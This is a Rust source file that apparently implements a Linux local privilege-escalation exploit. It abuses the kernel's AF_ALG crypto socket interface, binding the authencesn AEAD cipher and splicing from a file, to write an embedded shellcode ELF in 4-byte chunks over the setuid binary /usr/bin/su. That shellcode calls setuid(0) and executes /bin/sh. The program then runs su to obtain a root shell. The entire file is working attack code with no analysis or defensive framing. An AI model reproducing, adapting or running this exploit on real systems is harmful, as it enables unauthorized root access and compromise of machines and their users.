use std::ffi::c_void;
use std::fs::File;
use std::os::fd::AsRawFd;
use std::path::Path;

const ALG_TYPE: &[u8; 14] = b"aead\0\0\0\0\0\0\0\0\0\0";
const ALG_NAME: &[u8; 64] = b"authencesn(hmac(sha256),cbc(aes))\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";

const KEY: &[u8; 40] =
    b"\x08\0\x01\0\0\0\0\x10\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";

const OPERATION: &[u8; 4] = b"\0\0\0\0";
const IV: &[u8; 20] = b"\x10\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
const AEAD_ASSOCLEN: &[u8; 4] = b"\x08\0\0\0";

const SHELLCODE: &[u8; 160] = &[
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x9e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xc0, 0x31, 0xff, 0xb0, 0x69, 0x0f, 0x05,
    0x48, 0x8d, 0x3d, 0x0f, 0x00, 0x00, 0x00, 0x31, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05, 0x31,
    0xff, 0x6a, 0x3c, 0x58, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x00, 0x00,
];

fn errno() -> i32 {
    unsafe { *libc::__errno_location() }
}

fn strerror(n: i32) -> String {
    unsafe { std::ffi::CStr::from_ptr(libc::strerror(n)) }
        .to_str()
        .unwrap_or_default()
        .to_string()
}

fn write_cross_boundary(file_descriptor: i32, offset: usize, chunk: &[u8; 4]) {
    let socket = unsafe { libc::socket(libc::AF_ALG, libc::SOCK_SEQPACKET, 0) };
    if socket == -1 {
        eprintln!("bad socket: {}", strerror(errno()));
        std::process::exit(1)
    }

    let mut sockaddr_alg: libc::sockaddr_alg = unsafe { std::mem::zeroed() };
    sockaddr_alg.salg_family = libc::AF_ALG as u16;
    sockaddr_alg.salg_type = *ALG_TYPE;
    sockaddr_alg.salg_name = *ALG_NAME;

    if let -1 = unsafe {
        libc::bind(
            socket,
            &sockaddr_alg as *const libc::sockaddr_alg as *const libc::sockaddr,
            size_of::<libc::sockaddr_alg>() as u32,
        )
    } {
        eprintln!("bad bind: {}", strerror(errno()));
        std::process::exit(1)
    }

    unsafe {
        if let -1 = libc::setsockopt(
            socket,
            libc::SOL_ALG,
            libc::ALG_SET_KEY,
            KEY.as_ptr() as *const c_void,
            KEY.len() as u32,
        ) {
            eprintln!("bad setsockopt (key): {}", strerror(errno()));
            std::process::exit(1)
        }

        if let -1 = libc::setsockopt(
            socket,
            libc::SOL_ALG,
            libc::ALG_SET_AEAD_AUTHSIZE,
            std::ptr::null(),
            4,
        ) {
            eprintln!("bad setsockopt (auth size): {}", strerror(errno()));
            std::process::exit(1)
        }
    };

    let connection_descriptor =
        unsafe { libc::accept(socket, std::ptr::null_mut(), std::ptr::null_mut()) };
    if connection_descriptor == -1 {
        eprintln!("bad accept: {}", strerror(errno()));
        std::process::exit(1)
    }

    let mut message: libc::msghdr = unsafe { std::mem::zeroed() };

    let mut data = [b'A'; 8];
    data[4..8].copy_from_slice(chunk);

    let mut io_vector = libc::iovec {
        iov_base: data.as_ptr() as *mut c_void,
        iov_len: data.len(),
    };

    message.msg_iov = &mut io_vector;
    message.msg_iovlen = 1;

    let control_messages_size = unsafe {
        libc::CMSG_SPACE(OPERATION.len() as u32)
            + libc::CMSG_SPACE(IV.len() as u32)
            + libc::CMSG_SPACE(AEAD_ASSOCLEN.len() as u32)
    } as usize;
    let mut control_messages_buffer = vec![0u8; control_messages_size];

    message.msg_control = control_messages_buffer.as_mut_ptr() as *mut c_void;
    message.msg_controllen = control_messages_size;

    let control_message = unsafe { libc::CMSG_FIRSTHDR(&message) };
    if control_message.is_null() {
        eprintln!(
            "set operation control message is null: {}",
            strerror(errno())
        );
        std::process::exit(1)
    }

    unsafe {
        (*control_message).cmsg_len = libc::CMSG_LEN(OPERATION.len() as u32) as usize;
        (*control_message).cmsg_level = libc::SOL_ALG;
        (*control_message).cmsg_type = libc::ALG_SET_OP;

        libc::CMSG_DATA(control_message)
            .copy_from_nonoverlapping(OPERATION.as_ptr(), OPERATION.len());
    }

    let control_message = unsafe { libc::CMSG_NXTHDR(&message, control_message) };
    if control_message.is_null() {
        eprintln!("set iv control message is null: {}", strerror(errno()));
        std::process::exit(1)
    }

    unsafe {
        (*control_message).cmsg_len = libc::CMSG_LEN(IV.len() as u32) as usize;
        (*control_message).cmsg_level = libc::SOL_ALG;
        (*control_message).cmsg_type = libc::ALG_SET_IV;

        libc::CMSG_DATA(control_message).copy_from_nonoverlapping(IV.as_ptr(), IV.len());
    }

    let control_message = unsafe { libc::CMSG_NXTHDR(&message, control_message) };
    if control_message.is_null() {
        eprintln!(
            "set aead assoclen control message is null: {}",
            strerror(errno())
        );
        std::process::exit(1)
    }

    unsafe {
        (*control_message).cmsg_len = libc::CMSG_LEN(AEAD_ASSOCLEN.len() as u32) as usize;
        (*control_message).cmsg_level = libc::SOL_ALG;
        (*control_message).cmsg_type = libc::ALG_SET_AEAD_ASSOCLEN;

        libc::CMSG_DATA(control_message)
            .copy_from_nonoverlapping(AEAD_ASSOCLEN.as_ptr(), AEAD_ASSOCLEN.len());
    }

    if let -1 = unsafe { libc::sendmsg(connection_descriptor, &message, libc::MSG_MORE) } {
        eprintln!("bad sendmsg: {}", strerror(errno()));
        std::process::exit(1)
    };

    let (pipe_reader, pipe_writer) = std::io::pipe().unwrap_or_else(|err| {
        eprintln!("bad pipe: {err}");
        std::process::exit(1)
    });

    let splice_offset = offset + 4;
    let receive_buffer_size = splice_offset + 4;

    unsafe {
        if let -1 = libc::splice(
            file_descriptor,
            &mut 0,
            pipe_writer.as_raw_fd(),
            std::ptr::null_mut(),
            splice_offset,
            0,
        ) {
            eprintln!("bad writer splice: {}", strerror(errno()));
            std::process::exit(1)
        }

        if let -1 = libc::splice(
            pipe_reader.as_raw_fd(),
            std::ptr::null_mut(),
            connection_descriptor,
            std::ptr::null_mut(),
            splice_offset,
            0,
        ) {
            eprintln!("bad reader splice: {}", strerror(errno()));
            std::process::exit(1)
        }

        libc::recv(
            connection_descriptor,
            vec![0; receive_buffer_size].as_mut_ptr() as *mut c_void,
            receive_buffer_size,
            0,
        );

        if let -1 = libc::close(connection_descriptor) {
            eprintln!("bad close on connection: {}", strerror(errno()));
        }

        if let -1 = libc::close(socket) {
            eprintln!("bad close on socket: {}", strerror(errno()));
        }
    }
}

const TARGET_BINARY: &str = "/usr/bin/su";

fn main() {
    let path = Path::new(TARGET_BINARY);
    let file = File::open(path).unwrap_or_else(|err| {
        eprintln!("failed to open {}: {}", TARGET_BINARY, err);
        std::process::exit(1)
    });

    let file_descriptor = file.as_raw_fd();

    SHELLCODE
        .chunks_exact(4)
        .enumerate()
        .for_each(|(i, chunk)| {
            write_cross_boundary(
                file_descriptor,
                i * 4,
                TryInto::<&[u8; 4]>::try_into(chunk).unwrap(),
            );
        });

    if let -1 = unsafe {
        libc::execve(
            std::ffi::CString::new(TARGET_BINARY).unwrap().as_ptr(),
            std::ptr::null(),
            std::ptr::null(),
        )
    } {
        eprintln!("bad execve: {}", strerror(errno()))
    }
}
